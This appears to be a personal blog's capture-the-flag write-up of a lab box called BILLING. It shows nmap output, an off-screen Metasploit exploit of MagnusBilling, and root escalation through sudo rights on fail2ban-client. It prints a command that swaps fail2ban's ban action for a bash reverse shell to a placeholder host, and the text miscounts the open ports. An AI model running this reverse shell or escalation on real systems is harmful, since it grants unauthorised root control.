@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BILLING | R3D_Z3E</title>
+<meta name="description" content="A box to test your enumeration and privilege escalation skills">
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+    <header class="site-header">
+    <div class="container">
+        <div class="nav-wrapper">
+            <a href="/" class="logo">
+                <img src="/images/logo.png" alt="R3D_Z3E Logo" class="logo-icon-img">
+                <span class="logo-text">R3D_Z3E</span>
+            </a>
+            <nav class="main-nav">
+                
+                <a href="/" class="nav-link">Home</a>
+                
+                <a href="/search/" class="nav-link">Search</a>
+                
+                <a href="https://r3d-z3e.me" class="nav-link">Portfolio</a>
+                
+                <a href="/whoami/" class="nav-link">Whoami</a>
+                
+                <a href="/tags/" class="nav-link">Tags</a>
+                
+            </nav>
+        </div>
+    </div>
+</header>
+
+    <main>
+        
+<article class="post-single">
+    <div class="container-narrow">
+        <header class="post-header">
+            <div class="post-meta">
+                <span class="category">Security</span>
+                <span class="date">November 24, 2025</span>
+                <span class="reading-time">5 min read</span>
+            </div>
+            <h1 class="post-title">BILLING</h1>
+        </header>
+        
+        <div class="post-content">
+            <hr>
+<p>Difficulty: Easy</p>
+<p><img src="https://i.imgur.com/b0ZPJey.png" alt=""></p>
+<hr>
+<hr>
+<p>I started this box with <code>Pull up</code> by Legendary ZerryDL after been away from boxes for a while due to personal reasons</p>
+<iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/4bMbA8VYJMC2QKJYH8PDpr?utm_source=generator" width="100%" height="352" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+<hr>
+<p>Another night to pull up againn, We go againnnnn</p>
+<p>Ion know what this box is all about what we are about to find out innit</p>
+<p>As we know the first thing is to get our nmap rolling</p>
+<pre tabindex="0"><code>nmap -p- -T4 -v --min-rate=1000 -sCV 10.10.228.118 -oN nmap.txt -Pn
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 21:09 EDT
+NSE: Loaded 157 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 21:09
+Completed NSE at 21:09, 0.00s elapsed
+Initiating NSE at 21:09
+Completed NSE at 21:09, 0.00s elapsed
+Initiating NSE at 21:09
+Completed NSE at 21:09, 0.00s elapsed
+Initiating SYN Stealth Scan at 21:09
+Scanning biling.thm (10.10.228.118) [65535 ports]
+Discovered open port 22/tcp on 10.10.228.118
+Discovered open port 80/tcp on 10.10.228.118
+Discovered open port 3306/tcp on 10.10.228.118
+Increasing send delay for 10.10.228.118 from 0 to 5 due to max_successful_tryno increase to 5
+Increasing send delay for 10.10.228.118 from 5 to 10 due to max_successful_tryno increase to 6
+Warning: 10.10.228.118 giving up on port because retransmission cap hit (6).
+SYN Stealth Scan Timing: About 41.60% done; ETC: 21:10 (0:00:44 remaining)
+Discovered open port 5038/tcp on 10.10.228.118
+Completed SYN Stealth Scan at 21:11, 87.03s elapsed (65535 total ports)
+Initiating Service scan at 21:11
+Scanning 4 services on biling.thm (10.10.228.118)
+Completed Service scan at 21:11, 7.01s elapsed (4 services on 1 host)
+NSE: Script scanning 10.10.228.118.
+Initiating NSE at 21:11
+Completed NSE at 21:11, 5.33s elapsed
+Initiating NSE at 21:11
+Completed NSE at 21:11, 1.07s elapsed
+Initiating NSE at 21:11
+Completed NSE at 21:11, 0.01s elapsed
+Nmap scan report for biling.thm (10.10.228.118)
+Host is up (0.23s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
+|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
+|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
+80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/mbilling/
+| http-title:             MagnusBilling        
+|_Requested resource was http://biling.thm/mbilling/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.56 (Debian)
+3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
+5038/tcp open  asterisk Asterisk Call Manager 2.10.6
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 21:11
+Completed NSE at 21:11, 0.01s elapsed
+Initiating NSE at 21:11
+Completed NSE at 21:11, 0.01s elapsed
+Initiating NSE at 21:11
+Completed NSE at 21:11, 0.01s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 105.13 seconds
+           Raw packets sent: 86086 (3.788MB) | Rcvd: 76850 (3.255MB)
+</code></pre><p>Lots of endpoints are located hereee, this is looking good alreadyyyy</p>
+<p>From the nmap scan, we discovered that they are 3 ports opened (22, 80, 3395, 5038)</p>
+<p>Let us start our directory search too while enumerating the website</p>
+<p><img src="https://i.imgur.com/qDY7x28.png" alt=""></p>
+<p>Now over to the website</p>
+<p><img src="https://i.imgur.com/wBc6AO8.png" alt=""></p>
+<p>Let us go back to our directory fuzzing</p>
+<p><img src="https://i.imgur.com/9bCVgpV.png" alt=""></p>
+<p>From there we were able to find the endpoint /robots.txt which still takes us to the login page</p>
+<p>So, let us try to get another thing</p>
+<p>Let us try enumerating the mysql</p>
+<p>Enumerating this left us with no luck either&hellip;&hellip;.</p>
+<p>So I just went ahead googling to see if there is and exploit for magnus billing CMS. Lo and behold there is an exploit for that&hellip;</p>
+<p>We are going to be using metasplot this time around</p>
+<p><img src="https://i.imgur.com/Rc91tj1.png" alt=""></p>
+<p>Bankaiii, we have initial access as seen below</p>
+<p><img src="https://i.imgur.com/mXjjRs4.png" alt=""></p>
+<p>Let us now go to find user flag</p>
+<p><img src="https://i.imgur.com/GZyX84g.png" alt=""></p>
+<p>Our work is halfdone, now let us go all in for the root flag</p>
+<p>So, now in this part root is kinda trickyyyyy but imma still explain to the best of my knowledge</p>
+<p>So after getting user flag, the first thing I always do is to try <code>sudo -l</code> to have a list of things that this user can do and this time was not in any way different</p>
+<p>After running the command, the following was that I got</p>
+<pre tabindex="0"><code>Matching Defaults entries for asterisk on Billing: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin 
+
+Runas and Command-specific defaults for asterisk: Defaults!/usr/bin/fail2ban-client !requiretty 
+
+User asterisk may run the following commands on Billing: (ALL) NOPASSWD: /usr/bin/fail2ban-client
+</code></pre><p>From here all I knew was to abuse fail2ban to pop root shell and <a href="https://juggernaut-sec.com/fail2ban-lpe/">https://juggernaut-sec.com/fail2ban-lpe/</a> was the blog that helped me out</p>
+<p>With all of this information, I crafted the following command:</p>
+<pre tabindex="0"><code>sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban &#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/YOUR_IP/YOUR_PORT 0&gt;&amp;1&#39;&#34;
+</code></pre><p>This command modifies the <code>actionban</code> rule for the <code>sshd</code> jail, replacing the default IP banning action with a reverse shell payload. Normally, Fail2Ban executes the <code>iptables-multiport</code> action to ban IP addresses attempting brute-force attacks. However, by injecting my command, I ensure that instead of banning an IP, Fail2Ban will execute my reverse shell.</p>
+<p>After modifying the <code>actionban</code> rule, I set up a listener on my machine to catch the reverse shell connection.</p>
+<p>Lastly, I executed the following command:</p>
+<pre tabindex="0"><code>sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
+</code></pre><p>This command is typically used to manually ban an IP address using Fail2Ban. However, since I had previously modified the <code>actionban</code> rule to execute my reverse shell payload instead of banning an IP, running this command triggered the exploit. I used <code>127.0.0.1</code> because it is the <strong>localhost IP address</strong>, meaning the machine essentially &ldquo;bans itself.&rdquo; Since Fail2Ban is configured to execute the <code>actionban</code> command whenever an IP is banned, triggering the ban on <code>127.0.0.1</code> ensures that the malicious command runs immediately on the same system without external dependencies.</p>
+<p>BecauseFail2Ban runs with elevated privileges, the shell was spawned with <strong>root</strong> access, successfully granting me full control over the system.</p>
+<p><img src="https://i.imgur.com/posPY62.png" alt=""></p>
+<p>With the root shell successfully obtained, I navigated to the <code>/root</code> directory and accessed the final flag!</p>
+<p><img src="https://i.imgur.com/VlS9ATs.png" alt=""></p>
+<p><button onclick="window.location.href='https://R3D-Z3E.github.io';">Back To Home螥</button></p>
+
+        </div>
+        
+        
+        <div class="post-tags">
+            
+            <a href="/tags/enumeration" class="tag">#Enumeration</a>
+            
+        </div>
+        
+    </div>
+</article>
+
+    </main>
+    <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <div class="footer-section footer-brand">
+                <h3 class="footer-title">R3D_Z3E</h3>
+                <p class="footer-desc">Breaking systems, building knowledge.</p>
+            </div>
+            
+            <div class="footer-section">
+                <h4 class="footer-heading">NAVIGATION</h4>
+                <ul class="footer-links">
+                    <li><a href="/">Blog</a></li>
+                    <li><a href="/whoami/">About Me</a></li>
+                    <li><a href="/tags/">Topics</a></li>
+                    <li><a href="/search/">Search</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4 class="footer-heading">SOCIAL</h4>
+                <ul class="footer-links">
+                    <li><a href="https://twitter.com/efagbule" target="_blank">𝕏 Twitter</a></li>
+                    <li><a href="https://github.com/r3d-z3e" target="_blank">⚙ GitHub</a></li>
+                    <li><a href="https://linkedin.com/in/ezekielfagbule" target="_blank">💼 LinkedIn</a></li>
+                    <li><a href="mailto:fagbuleolakunle223@gmail.com">☕ Buy Me a Coffee</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
